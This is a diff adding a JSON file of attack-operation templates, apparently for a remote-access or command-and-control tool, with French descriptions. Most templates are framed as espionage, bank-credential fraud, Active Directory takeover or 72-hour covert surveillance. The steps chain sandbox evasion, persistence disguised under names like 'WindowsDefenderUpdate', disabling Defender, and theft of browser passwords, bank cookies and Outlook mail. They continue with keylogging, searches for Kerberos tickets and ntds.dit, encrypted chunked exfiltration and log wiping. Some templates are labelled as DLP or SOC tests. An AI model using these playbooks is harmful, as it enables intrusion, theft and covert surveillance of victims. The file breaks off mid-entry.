@@ -1,0 +1,6364 @@
+{
+  "templates": [
+    {
+      "id": "op_nightshade",
+      "name": "OP NIGHTSHADE — Espionnage Corporate",
+      "description": "Opération d'espionnage longue durée ciblant les secrets R&D, emails dirigeants et propriété intellectuelle. Furtivité maximale : anti-forensics, persistance registry camouflée, exfil par chunks de 512KB sur HTTPS. Inspiré APT29.",
+      "icon": "🌑",
+      "category": "full",
+      "trigger": "on_connect",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Landing & Assess",
+          "steps": [
+            1,
+            2,
+            3,
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 2 — Ghost Install",
+          "steps": [
+            6,
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        {
+          "label": "Phase 3 — Recon Silencieux",
+          "steps": [
+            11,
+            12,
+            13,
+            14,
+            15,
+            16
+          ]
+        },
+        {
+          "label": "Phase 4 — IP Theft",
+          "steps": [
+            17,
+            18,
+            19,
+            20,
+            21
+          ]
+        },
+        {
+          "label": "Phase 5 — Exfil & Vanish",
+          "steps": [
+            22,
+            23,
+            24,
+            25
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "anti_analysis",
+          "action": "evade",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:evade"
+        },
+        {
+          "order": 3,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "sysinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:sysinfo"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "registry",
+            "key": "WindowsDefenderUpdate"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "scheduled_task",
+            "name": "AdobeAcrobatSync",
+            "interval": "daily"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "hide",
+          "params": {
+            "method": "attrib_hidden"
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:hide"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "disable_defender",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:disable_defender"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "firewall_rule",
+          "params": {
+            "action": "allow",
+            "port": 443,
+            "name": "MicrosoftTelemetry"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:firewall_rule"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "users",
+          "params": {},
+          "delay": 3,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:users"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 14,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              22,
+              80,
+              443,
+              445,
+              8080
+            ],
+            "timeout": 1
+          },
+          "delay": 5,
+          "timeout": 120,
+          "priority": "low",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 15,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "API_KEY",
+              "AWS",
+              "AZURE",
+              "GCP"
+            ]
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 17,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.pdf,*.docx,*.pptx,*.xlsx,*.dwg,*.cad",
+            "paths": [
+              "~/Documents",
+              "~/Desktop",
+              "~/Dropbox",
+              "~/OneDrive"
+            ],
+            "max": 300
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 18,
+          "module": "builtin",
+          "action": "outlook_emails",
+          "params": {
+            "limit": 500,
+            "folders": [
+              "Inbox",
+              "Sent",
+              "Drafts"
+            ]
+          },
+          "delay": 3,
+          "timeout": 120,
+          "priority": "critical",
+          "action_description": "Execute builtin:outlook_emails"
+        },
+        {
+          "order": 19,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ]
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "high",
+          "action_description": "Execute browser:passwords"
+        },
+        {
+          "order": 20,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 120,
+            "flush_interval": 30
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "normal",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 21,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 8,
+            "interval": 15
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 22,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 512000
+          },
+          "delay": 10,
+          "timeout": 600,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 23,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application",
+              "PowerShell"
+            ]
+          },
+          "delay": 5,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_logs"
+        },
+        {
+          "order": 24,
+          "module": "builtin",
+          "action": "clear_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:clear_history"
+        },
+        {
+          "order": 25,
+          "module": "builtin",
+          "action": "wipe_traces",
+          "params": {
+            "temp": true,
+            "prefetch": true,
+            "thumbcache": true
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:wipe_traces"
+        }
+      ]
+    },
+    {
+      "id": "op_lazarus",
+      "name": "OP LAZARUS — Fraude Financière",
+      "description": "Ciblage des outils financiers (SAP, QuickBooks, portails bancaires). Keylogger déclenché à l'ouverture des sessions de paiement, capture des credentials bancaires, monitoring des virements en cours. Inspiré Lazarus Group.",
+      "icon": "💸",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Target Profiling",
+          "steps": [
+            1,
+            2,
+            3,
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 2 — Credential Harvest",
+          "steps": [
+            7,
+            8,
+            9,
+            10,
+            11,
+            12
+          ]
+        },
+        {
+          "label": "Phase 3 — Financial Monitoring",
+          "steps": [
+            13,
+            14,
+            15,
+            16
+          ]
+        },
+        {
+          "label": "Phase 4 — Collect & Exfil",
+          "steps": [
+            17,
+            18,
+            19
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "installed",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:installed"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:netstat"
+        },
+        {
+          "order": 6,
+          "module": "screen_stream",
+          "action": "frame",
+          "params": {
+            "quality": 90
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute screen_stream:frame"
+        },
+        {
+          "order": 7,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge",
+              "ie"
+            ]
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:passwords"
+        },
+        {
+          "order": 8,
+          "module": "browser",
+          "action": "cookies",
+          "params": {
+            "filter": [
+              "bank",
+              "swift",
+              "sap",
+              "quickbooks",
+              "paypal",
+              "stripe"
+            ]
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute browser:cookies"
+        },
+        {
+          "order": 9,
+          "module": "browser",
+          "action": "autofill",
+          "params": {},
+          "delay": 2,
+          "timeout": 60,
+          "priority": "high",
+          "action_description": "Execute browser:autofill"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "BANK",
+              "SWIFT",
+              "IBAN",
+              "SAP",
+              "PAY",
+              "STRIPE",
+              "WIRE"
+            ]
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 12,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.qbw,*.sap,*.xlsx,*.csv,IBAN*,SWIFT*,wire*",
+            "max": 100
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 13,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 300,
+            "flush_interval": 30,
+            "filter_apps": [
+              "chrome",
+              "firefox",
+              "sap",
+              "quickbooks"
+            ]
+          },
+          "delay": 5,
+          "timeout": 360,
+          "priority": "critical",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 14,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 15,
+            "interval": 20
+          },
+          "delay": 5,
+          "timeout": 400,
+          "priority": "high",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 15,
+          "module": "screen_stream",
+          "action": "start",
+          "params": {
+            "fps": 2,
+            "quality": 70
+          },
+          "delay": 5,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute screen_stream:start"
+        },
+        {
+          "order": 16,
+          "module": "remote_control",
+          "action": "clipboard_get",
+          "params": {},
+          "delay": 10,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute remote_control:clipboard_get"
+        },
+        {
+          "order": 17,
+          "module": "builtin",
+          "action": "outlook_emails",
+          "params": {
+            "limit": 200,
+            "folders": [
+              "Inbox",
+              "Sent"
+            ],
+            "filter": [
+              "payment",
+              "invoice",
+              "wire",
+              "transfer",
+              "IBAN"
+            ]
+          },
+          "delay": 5,
+          "timeout": 120,
+          "priority": "high",
+          "action_description": "Execute builtin:outlook_emails"
+        },
+        {
+          "order": 18,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 256000
+          },
+          "delay": 10,
+          "timeout": 300,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 19,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "Application"
+            ]
+          },
+          "delay": 5,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:clear_logs"
+        }
+      ]
+    },
+    {
+      "id": "op_phantom_employee",
+      "name": "OP PHANTOM EMPLOYEE — Insider Threat",
+      "description": "Simule un employé malveillant avec accès légitime au réseau. Collecte discrète de données confidentielles, contacts, code source et projets. Exfil via compression camouflée. Test de DLP et monitoring interne.",
+      "icon": "🕴",
+      "category": "exfil",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Profiling Environnement",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — Collecte Données Corp",
+          "steps": [
+            5,
+            6,
+            7,
+            8,
+            9
+          ]
+        },
+        {
+          "label": "Phase 3 — Contacts & Réseau",
+          "steps": [
+            10,
+            11,
+            12
+          ]
+        },
+        {
+          "label": "Phase 4 — Code Source & IP",
+          "steps": [
+            13,
+            14,
+            15
+          ]
+        },
+        {
+          "label": "Phase 5 — Exfil Camouflée",
+          "steps": [
+            16,
+            17
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "disks",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:disks"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "recent_files",
+          "params": {
+            "limit": 200
+          },
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:recent_files"
+        },
+        {
+          "order": 5,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.pdf,*.docx,*.pptx,*.xlsx",
+            "paths": [
+              "~/Documents",
+              "~/Desktop",
+              "~/SharePoint",
+              "~/Teams",
+              "~/OneDrive"
+            ],
+            "max": 500
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "high",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 6,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "NDA*,Confidentiel*,Secret*,Proprietary*,*.p12,*.pfx",
+            "max": 100
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "outlook_emails",
+          "params": {
+            "limit": 1000,
+            "folders": [
+              "Inbox",
+              "Sent",
+              "Contacts"
+            ]
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "high",
+          "action_description": "Execute builtin:outlook_emails"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "telegram_data",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:telegram_data"
+        },
+        {
+          "order": 9,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 10,
+            "interval": 5
+          },
+          "delay": 5,
+          "timeout": 90,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 11,
+          "module": "wifi",
+          "action": "scan",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute wifi:scan"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 13,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.py,*.js,*.ts,*.go,*.java,*.cs,*.cpp,*.h,*.sol",
+            "paths": [
+              "~/code",
+              "~/projects",
+              "~/src",
+              "~/dev",
+              "~/repos",
+              "~/git"
+            ],
+            "max": 500
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 14,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.sql,*.db,*.sqlite,*.mdb,*.bak",
+            "max": 50
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "high",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 15,
+          "module": "browser",
+          "action": "history",
+          "params": {
+            "limit": 2000
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "low",
+          "action_description": "Execute browser:history"
+        },
+        {
+          "order": 16,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 1024000,
+            "disguise_ext": ".bak"
+          },
+          "delay": 10,
+          "timeout": 600,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 17,
+          "module": "builtin",
+          "action": "clear_history",
+          "params": {},
+          "delay": 3,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:clear_history"
+        }
+      ]
+    },
+    {
+      "id": "op_domino",
+      "name": "OP DOMINO — AD Takeover",
+      "description": "Prise de contrôle progressive d'un Active Directory. Énumération réseau → identification des DCs → dump des sessions admin actives → collecte tickets Kerberos → cartographie trusts → pivot préparé vers serveurs critiques.",
+      "icon": "🎯",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Network Mapping",
+          "steps": [
+            1,
+            2,
+            3,
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 2 — AD Enumeration",
+          "steps": [
+            6,
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        {
+          "label": "Phase 3 — Credential Access",
+          "steps": [
+            11,
+            12,
+            13,
+            14
+          ]
+        },
+        {
+          "label": "Phase 4 — Pivot Preparation",
+          "steps": [
+            15,
+            16,
+            17
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "arp",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:arp"
+        },
+        {
+          "order": 4,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              22,
+              53,
+              80,
+              88,
+              135,
+              139,
+              389,
+              443,
+              445,
+              464,
+              636,
+              3268,
+              3269,
+              3389,
+              5985,
+              9389
+            ],
+            "timeout": 1
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "normal",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "dns_enum",
+          "params": {
+            "domain": "corp.local"
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute builtin:dns_enum"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "domain_computers",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_computers"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "trust_domains",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:trust_domains"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 3,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "sessions",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:sessions"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 14,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.kirbi,*.ccache,ntds.dit,SYSTEM,SAM,*.pfx,*.p12",
+            "max": 50
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 15,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:netstat"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "registry",
+            "key": "WindowsNetworkDiagnostics"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 17,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System"
+            ]
+          },
+          "delay": 3,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:clear_logs"
+        }
+      ]
+    },
+    {
+      "id": "op_shadow_watch",
+      "name": "OP SHADOW WATCH — Surveillance 72h",
+      "description": "Présence silencieuse prolongée 24-72h. Installation furtive → keylogger continu + screenshots toutes les 60s + monitoring réseau + collecte browser périodique → rapport comportemental complet sur la cible. Aucun bruit réseau excessif.",
+      "icon": "👁",
+      "category": "surveillance",
+      "trigger": "on_connect",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Install Furtif",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — Surveillance Active",
+          "steps": [
+            5,
+            6,
+            7,
+            8,
+            9
+          ]
+        },
+        {
+          "label": "Phase 3 — Collect Périodique",
+          "steps": [
+            10,
+            11,
+            12
+          ]
+        },
+        {
+          "label": "Phase 4 — Maintenance",
+          "steps": [
+            13,
+            14
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "anti_analysis",
+          "action": "evade",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:evade"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "registry",
+            "key": "SysHostManager"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "scheduled_task",
+            "name": "WindowsHostManager",
+            "interval": "hourly"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 5,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 86400,
+            "flush_interval": 300
+          },
+          "delay": 5,
+          "timeout": 87000,
+          "priority": "high",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 6,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 50,
+            "interval": 60
+          },
+          "delay": 5,
+          "timeout": 4000,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 7,
+          "module": "screen_stream",
+          "action": "start",
+          "params": {
+            "fps": 1,
+            "quality": 40
+          },
+          "delay": 10,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute screen_stream:start"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 5,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute builtin:netstat"
+        },
+        {
+          "order": 9,
+          "module": "remote_control",
+          "action": "clipboard_get",
+          "params": {},
+          "delay": 30,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute remote_control:clipboard_get"
+        },
+        {
+          "order": 10,
+          "module": "browser",
+          "action": "history",
+          "params": {
+            "limit": 500
+          },
+          "delay": 120,
+          "timeout": 60,
+          "priority": "low",
+          "action_description": "Execute browser:history"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 60,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 12,
+          "module": "wifi",
+          "action": "scan",
+          "params": {},
+          "delay": 300,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute wifi:scan"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security"
+            ]
+          },
+          "delay": 3600,
+          "timeout": 20,
+          "priority": "low",
+          "action_description": "Execute builtin:clear_logs"
+        },
+        {
+          "order": 14,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 3600,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute info:run"
+        }
+      ]
+    },
+    {
+      "id": "op_kraken",
+      "name": "OP KRAKEN — Test Réponse Ransomware",
+      "description": "Simulation complète d'une attaque ransomware (SANS chiffrement réel) pour tester les capacités de détection et réponse du SOC. Kill processes → enum shadow copies → marquage fichiers → lateral prep → exfil données → cover tracks.",
+      "icon": "🐙",
+      "category": "simulation",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Initial Access",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — Defense Disabling",
+          "steps": [
+            5,
+            6,
+            7
+          ]
+        },
+        {
+          "label": "Phase 3 — Impact Assessment",
+          "steps": [
+            8,
+            9,
+            10,
+            11
+          ]
+        },
+        {
+          "label": "Phase 4 — Ransom Simulation",
+          "steps": [
+            12,
+            13
+          ]
+        },
+        {
+          "label": "Phase 5 — Exfil Before Lock",
+          "steps": [
+            14,
+            15,
+            16
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "disable_defender",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:disable_defender"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "shadow_copies",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:shadow_copies"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "backups_enum",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:backups_enum"
+        },
+        {
+          "order": 8,
